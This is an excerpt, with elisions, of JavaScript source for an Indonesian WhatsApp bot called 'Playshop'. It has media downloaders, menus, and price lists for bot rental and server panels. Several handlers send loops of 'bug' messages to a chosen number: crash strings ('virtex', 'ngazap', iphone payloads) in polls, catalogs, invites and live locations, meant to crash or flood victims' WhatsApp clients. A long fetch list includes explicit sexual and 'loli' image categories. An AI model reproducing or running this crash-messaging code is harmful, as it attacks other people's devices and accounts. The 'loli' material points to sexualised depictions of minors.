...
const { iphone1 } = require('./scrape/iphone1')
const { iphone2 } = require('./scrape/iphone2')
const { iphone3 } = require('./scrape/iphone3')
const { iphone4 } = require('./scrape/iphone4')
const { iphone5 } = require('./scrape/iphone5')
const { iphone6 } = require('./scrape/iphone6')
...
try {
        ...
        const UltahCreator = new Date('April 10, 2023 00:00:00')
...
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: '6281574773972@s.whatsapp.net' } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
...
"fileName": `Playshop Bot WhatsApp${ngazap(prefix)}`,
...
"message": {
"pollCreationMessage": {
"name": `Playshop ${virus}${virtex(prefix)}`,
"options": [
	{
...
"optionName": "KATANYA KEBAL"
	...
	{
"optionName": "SALAM DARI Playshop"
	}
],
...
"status": "INQUIRY",
"surface": "CATALOG",
"message": `Playshop Bot WhatsApp${ngazap(prefix)}`,
"orderTitle": "Playshop Bot WhatsApp${ngazap(prefix)}",
"sellerJid": "6281574773972@s.whatsapp.net",
...
const botzkayla = "6281574773972@s.whatsapp.net"
const mark = "0@s.whatsapp.net"
const timestamp = speed()
const latensi = speed() - timestamp
const butlocNye = [
{buttonId: `${prefix}owner`, buttonText: {displayText: '👾 𝗢𝗪𝗡𝗘𝗥'}, type: 1},
{buttonId: `${prefix}storemenu`, buttonText: {displayText: '🛍️ 𝗦𝗧𝗢𝗥𝗘'}, type: 1},
{buttonId: `${prefix}donasi`, buttonText: {displayText: '💰 𝗗𝗢𝗡𝗔𝗦𝗜'}, type: 1}
]
const buttonLocnya = {
location: { jpegThumbnail: ppnyauser } ,
caption: `Hai Kak @${sender.split("@")[0]} 
𝘚𝘢𝘺𝘢 ᴘʟᴀʏꜱʜᴏᴘ 𝘉𝘰𝘵 𝘞𝘩𝘢𝘵𝘴𝘈𝘱𝘱 𝘠𝘢𝘯𝘨 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘯𝘵𝘶 𝘈𝘯𝘥𝘢 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘚𝘵𝘪𝘤𝘬𝘦𝘳, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘛𝘪𝘬𝘵𝘰𝘬, 𝘋𝘰𝘸𝘯𝘭𝘰𝘢𝘥 𝘝𝘪𝘥𝘦𝘰/𝘈𝘶𝘥𝘪𝘰 𝘠𝘰𝘶𝘵𝘶𝘣𝘦, 𝘔𝘦𝘮𝘣𝘶𝘢𝘵 𝘓𝘰𝘨𝘰 𝘛𝘦𝘹𝘵 𝘗𝘳𝘰/𝘗𝘩𝘰𝘵𝘰𝘰𝘹𝘺/𝘌𝘱𝘩𝘰𝘵𝘰360, 𝘋𝘢𝘯 𝘓𝘢𝘪𝘯-𝘭𝘢𝘪𝘯.

𝘖𝘵𝘸 𝘛𝘢𝘩𝘶𝘯 𝘉𝘢𝘳𝘶
${jhari} 𝑯𝒂𝒓𝒊 ${jjam} 𝑱𝒂𝒎 ${jmenit} 𝑴𝒆𝒏𝒊𝒕 ${jdetik} 𝑫𝒆𝒕𝒊𝒌
𝘖𝘵𝘸 𝘐𝘥𝘶𝘭 𝘍𝘪𝘵𝘳𝘪
${hahari} 𝑯𝒂𝒓𝒊 ${hajam} 𝑱𝒂𝒎 ${hamenit} 𝑴𝒆𝒏𝒊𝒕 ${hadetik} 𝑫𝒆𝒕𝒊𝒌
𝘖𝘵𝘸 𝘐𝘥𝘶𝘭 𝘈𝘥𝘩𝘢
${hihari} 𝑯𝒂𝒓𝒊 ${hijam} 𝑱𝒂𝒎 ${himenit} 𝑴𝒆𝒏𝒊𝒕 ${hidetik} 𝑫𝒆𝒕𝒊𝒌
𝘖𝘵𝘸 𝘜𝘭𝘵𝘢𝘩 𝘊𝘳𝘦𝘢𝘵𝘰𝘳
${kayhari} 𝑯𝒂𝒓𝒊 ${kayjam} 𝑱𝒂𝒎 ${kaymenit} 𝑴𝒆𝒏𝒊𝒕 ${kaydetik} 𝑫𝒆𝒕𝒊𝒌`,
...
Title : ${atdl.title}`, `Auto Downloader By Playshop`, ftext)
}
}
...
{title: `⊟ 𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨`, rowId: `${prefix}storemenu`},
...
{title: `⊟ 𝗖𝗢𝗡𝗩𝗘𝗥𝗧 𝗠𝗘𝗡𝗨`, rowId: `${prefix}convertmenu`},
...
mentions: [sender],
footer: fake,
buttonText: 'List Button By Playshop',
sections: seactions,
listType: 1}
...
"mediaType": 1, 
"thumbnail": ppnyauser,
"mediaUrl": 'https://chat.whatsapp.com/KPlcAOzYnun7dEUooBBnTe',
"sourceUrl": 'https://chat.whatsapp.com/KPlcAOzYnun7dEUooBBnTe'
}
}
})
break
...
break
case 'ghstalk':{
if (!q) return reply(`Contoh ${prefix+command} Playshop`)
reply(mess.wait)
...
teskd += `\n${listnyd++}. @${i.split("@")[0]}`
listBloxk.push({
title: "+" + i.split("@")[0], rowId: `ban del ${i.split("@")[0]}`, description: "Ketuk Untuk Batalkan Blockir"})
}
teskd += `\n\Ketuk Button Untuk Batalkan Blockirr`
const sections = [
{
...
var nomor = m.sender
let buttons = [
{ buttonId: '.leave', buttonText: { displayText: 'Akhiri' }, type: 1 }
]
await kayla.sendButtonText(num, buttons, `Hi Kak ada yang kirim menfes nih.

👤 Dari : Pengirim Rahasia
💌 Pesan : ${pesan}
`, `📮 Mau balas pesan ini ka? bisa koq ka. tinggal ketik pesan kaka lalu kirim, nanti saya sampaikan, jika kaka mau akhiri percakapan bisa tekan tombol Akhiri Chat dibawah ya thanks ...`, m)
...
⬡──⬡─────────⬡──⬡
📮Note : Ketik .leave untuk mengakhiri chat`
...
let ghd = await kayla.sendMessage(m.chat,{video:{url: res.url[0].url},caption: "Sukses"},{quoted:m})
}
break
case "tiktokaudio":{
if (!q) return reply (`Link Nya Kak???\nContoh ${prefix+command} https://vm.tiktok.com/ZSRApJY1K/`)
reply(mess.wait)
let res = await tiktok(q)
let ghd = await kayla.sendMessage(m.chat,{audio:{url: res.url[1].url}, mimetype: "audio/mp4", ptt:false},{quoted:m})
}
break
case "facebook": case "fbreels":{
if (!q) return reply(`Link Nya Kak???\nContoh ${prefix+command} https://www.facebook.com/AdrianWidjy/videos/1184330035623519/?mibextid=oYc6mwk1AU47K508`)
reply(mess.wait)
let res = await facebook(q)
let ghd = await kayla.sendMessage(m.chat,{video:{url: res.url[0].url},caption: "Sukses"},{quoted:m})
}
break
case "instagram": case "igreels":{
if (!q) return reply(`https://www.instagram.com/reel/ClQeXs1AWVp/?igshid=NTdlMDg3MTY=`)
reply(mess.wait)
...
break
case "twitter":{
if (!q) return reply(`Link Nya Kak???\nContoh ${prefix+command} https://twitter.com/rahsh33m/status/1602116119518642177?s=20&t=W0ijFbZQbnSPREOSJZkAwA`)
reply(mess.wait)
...
break
case 'googles': {
if (!q) return reply(`Example : ${prefix + command} Playshop WhatsApp`)
reply(mess.wait)
...
owned = '6281574773972@s.whatsapp.net'
ngen = `
Title : ${anu.title}
Ext : Search
ID : ${anu.videoId}
...
fromMe: false,
participant: `0@s.whatsapp.net`,
remoteJid: "6281574773972-1626053991@g.us"
},
message: {
orderMessage: {
itemCount: 99999999,
...
rows: [
{title: `Rp. 15.000 / Bulan`, rowId: `${prefix}ownkay 1g`},
]
},
{
title: `🔰 RAM 2GB CPU 50% `,
rows: [
{title: `Rp. 20.000 / Bulan`, rowId: `${prefix}ownkay 2g`},
]
},
{
title: `🔰 RAM 3GB CPU 75% `,
rows: [
{title: `Rp. 30.000 / Bulan`, rowId: `${prefix}ownkay 3g`},
]
},
{
title: `🔰 RAM 4GB CPU 100% `,
rows: [
{title: `Rp. 35.000 / Bulan`, rowId: `${prefix}ownkay 4g`},
]
},
{
title: `🔰 RAM 5GB CPU 130% `,
rows: [
{title: `Rp. 40.000 / Bulan`, rowId: `${prefix}ownkay 5g`},
]
},
{
title: `🔰 RAM 6GB CPU 150% `,
rows: [
{title: `Rp. 45.000 / Bulan`, rowId: `${prefix}ownkay 6g`},
]
},
{
title: `🔰 RAM 7GB CPU 170% `,
rows: [
{title: `Rp. 50.000 / Bulan`, rowId: `${prefix}ownkay 7g`},
]
}
]
const listSw = { 
...
{title: `PERMANEN 15K`, rowId: `${prefix}premkay 1tahun`},
]
}
]
const listSw = { 
...
title: `LIST SEWABOT`,
rows: [
{title: `1 MINGGU 10K`, rowId: `${prefix}sewakay 1minggu`},
{title: `1 BULAN 30K`, rowId: `${prefix}sewakay 1bulan`},
{title: `PERMANEN 3K`, rowId: `${prefix}sewakay Permanen`},
]
}
]
const listSw = { 
...
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 30K • Sewabot 1 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1tahun'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* Permanen • Sewabot Permanen
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
}
break
case 'premkay':
...
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 15K • PANEL 25% CPU 1GB RAM
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '2g'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 20K • PANEL 50% CPU 2GB RAM
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '3g'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 30K • PANEL 75% CPU 3GB RAM
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '4g'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 35K • PANEL 100% CPU 4GB RAM
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '5g'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 30K • PANEL 125% CPU 5GB RAM
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '6g'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 45K • PANEL 150% CPU 6GB RAM
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '7g'){
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 50K • PANEL 170% CPU 7GB RAM
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} 
break
case 'botkay':
...
reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
kayla.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 25K • Jadi Owner Permanent
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
}
break
case 'addprem':
if (!itsMeKayla) return reply(mess.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281574773972`)
...
if (!itsMeKayla) return reply(mess.owner)
teks = '*List Owner*\n\n'
for (let kayla of owner) {
teks += `- ${kayla}\n`
}
teks += `\n*Total : ${owner.length}*`
kayla.sendMessage(m.chat, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": owner } })
break
case 'listpremium':
if (!itsMeKayla) return reply(mess.owner)
teks = '*List Premium*\n\n'
...
contextInfo:{
"externalAdReply": {
"title": `Playshop Bot ${virus}${virtex(prefix)}`,
"body": `Playshop Bot ${virus}${virtex(prefix)}`,
mimetype: 'audio/mpeg', 
caption: `Playshop Bot WhatsApp${ngazap(prefix)}`,
showAdAttribution: true,
...
Message: { 
extendedTextMessage: { 
text: `Playshop Bot ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
...
"caption": `GEEKZBOT ${virus}${virtex(prefix)}`,
...
Message: { 
extendedTextMessage: { 
text: `GEEKZBOT ${virus}${virtex(prefix)}`, 
currencyCodeIso4217: 'IDR', 
requestFrom: '0@s.whatsapp.net', 
expiryTimestamp: 8000, 
amount: 1, 
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `Playshop Bot ${virus}${virtex(prefix)}`, `Playshop Bot ${virus}${virtex(prefix)}`, `Playshop Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(num, `Playshop Bot ${virus}${iphone(prefix)}`, `Playshop Bot ${virus}${iphone(prefix)}`, `Playshop Bot ${virus}${iphone(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
}
...
"title": `Playshop Bot WhatsApp ${virus} ${virtex(prefix)}`,
...
"url": `https://wa.me/6285691387215`
},
"businessOwnerJid": "6285691387215@s.whatsapp.net",
}
...
jumlah = '25'
for (let i = 0; i < jumlah; i++) {
sendBugcrash(m.chat, `Playshop Bot ${virus}${virtex(prefix)}`, `Playshop Bot ${virus}${virtex(prefix)}`, `Playshop Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
await sleep(1000)
}
reply(`Sukses Send Bug Sebanyak ${jumlah}`)
}
...
var buginvite = generateWAMessageFromContent(from, { groupInviteMessage: { groupJid: '6281574773972@g.us', inviteCode: 'UkJdqTXupAtmDwo4', inviteExpiration: '1643553084', invitetime: '1643293887000', groupName: `ৡৢ͜͡𝟒𝟎𝟒-Geekz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, thumbnail: ppnyauser, caption: `ৡৢ͜͡𝟒𝟎𝟒-Geekz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, contextInfo: { forwardingScore: 150, isForwarded: true },},},{ quoted: lep })
...
var liveLocation = generateWAMessageFromContent(from,proto.Message.fromObject({ liveLocationMessage: { degreesLatitude: -6.9367014, degreesLongitude: 107.7228574, caption: `ৡৢ͜͡𝟒𝟎𝟒-Geekz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, sequenceNumber: '1657237469254001', jpegThumbnail: messa.imageMessage } }),{ userJid: from, quoted: lep })
for (let i = 0; i < jumlah; i++) {
...
kayla.sendKatalog(numt, `ৡৢ͜͡𝟒𝟎𝟒-Geekz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, `ৡৢ͜͡𝟒𝟎𝟒-Geekz ⸸⁶⁶⁶_さん ${ngazap(prefix)}`, ppnyauser, { quoted: lep })
...
reply(`Sukses Spam Bug VIP Sebanyak ${jumlah}`)
}
break
case 'sendbug':{
if (!itsMeKayla) return reply(mess.owner)
...
"name": `Playshop Bot WhatsApp ${virus}`,
"address": `Created By Playshop ${virtex(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
...
case '1917': 
case 'leaves': {
if (!q) return reply(`Example : ${prefix+command} Geekz`) 
reply(mess.wait)
let link
...
reply(mess.wait)
let heyy
if (/aesthetic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/aesthetic.json')
if (/ahegao/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/ahegao.json')
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/ana.json')
if (/anjing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/anjing.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/art.json')
if (/ass/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/ass.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/ayuzawa.json')
if (/bdsm/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/bdsm.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/cosplaysagiri.json')
if (/cuckold/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/cuckold.json')
if (/cum/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/cum.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/cyber.json')
if (/darkjokes/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/darkjokes.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/emilia.json')
if (/ero/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/ero.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/femdom.json')
if (/foot/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/foot.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/gamewallpaper.json')
if (/gangbang/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/gangbang.json')
if (/gifs/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/gifs.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/gremory.json')
if (/hekel/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/hekel.json')
if (/hentai/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/hentai.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/hestia.json')
if (/hijaber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/hijaber.json')
if (/hinata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/hinata.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/itori.json')
if (/jahy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/jahy.json')
if (/jeni/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/kaori.json')
if (/kartun/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/kartun.json')
if (/katakata/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/lisa.json')
if (/loli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/madara.json')
if (/masturbation/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/masturbation.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/miku.json')
if (/milf/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/milf.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/minato.json')
if (/mobil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/naruto.json')
if (/neko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/neko.json')
if (/neko2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/neko2.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/nezuko.json')
if (/onepiece/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/onepiece.json')
if (/orgy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/orgy.json')
if (/panties/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/panties.json')
if (/pentol/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/pentol.json')
if (/pokemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/pokemon.json')
if (/profil/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/profil.json')
if (/progamming/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/programming.json')
if (/pubg/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/pubg.json')
if (/pussy/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/pussy.json')
if (/randblackpink/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/randblackpink.json')
if (/randomnime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/randomnime.json')
if (/randomnime2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/randomnime2.json')
if (/rize/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/rize.json')
if (/rose/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/rose.json')
if (/ryujin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/ryujin.json')
if (/sagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/sagiri.json')
if (/sakura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/sakura.json')
if (/sasuke/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/sasuke.json')
if (/satanic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/INODGEEKZ/nyenyee/master/satanic.json')
